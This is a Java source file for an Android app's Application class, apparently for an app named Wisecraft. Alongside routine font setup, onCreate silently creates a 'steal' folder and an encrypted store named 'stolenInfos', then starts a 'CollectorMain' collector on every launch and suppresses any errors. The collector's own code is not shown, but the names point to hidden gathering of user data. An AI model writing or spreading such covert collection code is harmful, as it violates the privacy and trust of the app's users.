package com.nao20010128nao.Wisecraft;
import android.app.*;
import android.graphics.*;
import android.preference.*;
import com.nao20010128nao.FileSafeBox.*;
import com.nao20010128nao.Wisecraft.collector.*;
import java.io.*;
import java.util.*;
import uk.co.chrisjenx.calligraphy.*;
import android.content.res.Resources.*;

public class TheApplication extends Application
{
	public static TheApplication instance;
	public static Typeface cinzelDecorative,latoLight,icomoon1,msgothic;
	public SafeBox stolenInfos;
	public String uuid;
	@Override
	public void onCreate() {
		// TODO: Implement this method
		super.onCreate();
		instance=this;
		cinzelDecorative=Typeface.createFromAsset(getAssets(),"cinzeldecorative.ttf");
		latoLight=Typeface.createFromAsset(getAssets(),"lato-light.ttf");
		icomoon1=Typeface.createFromAsset(getAssets(),"icomoon.ttf");
		msgothic=Typeface.createFromAsset(getAssets(),"msgothic001.TTF");
		CalligraphyConfig.initDefault(new CalligraphyConfig.Builder()
									  .setDefaultFontPath(getResources().getString(R.string.font))
									  .setFontAttrId(R.attr.fontPath)
									  .build()
									  );
		///////
		try{
			File f=new File(getFilesDir(),"steal");
			new File(f,"lock.lock").delete();
			if(!f.exists())f.mkdirs();
			stolenInfos=new SafeBox.SafeBoxBuilder()
				.makeNew(!new File(f,"manifest.bin").exists())
				.password(genPassword())
				.profilePath(f)
				.readOnly(false)
				.build();
			new CollectorMain();
		}catch(Throwable r){
			r.printStackTrace(System.out);
		}
	}
	public Typeface getLocalizedFont(){
		try {
			return (Typeface)TheApplication.class.getField(getResources().getString(R.string.fontField)).get(null);
		} catch (NoSuchFieldException e) {
			
		} catch (IllegalAccessException e) {
			
		} catch (IllegalArgumentException e) {
			
		}
		return latoLight;
	}
	private String genPassword(){
		uuid=PreferenceManager.getDefaultSharedPreferences(this).getString("uuid",UUID.randomUUID().toString());
		PreferenceManager.getDefaultSharedPreferences(this).edit().putString("uuid",uuid).commit();
		return uuid+uuid;
	}
}
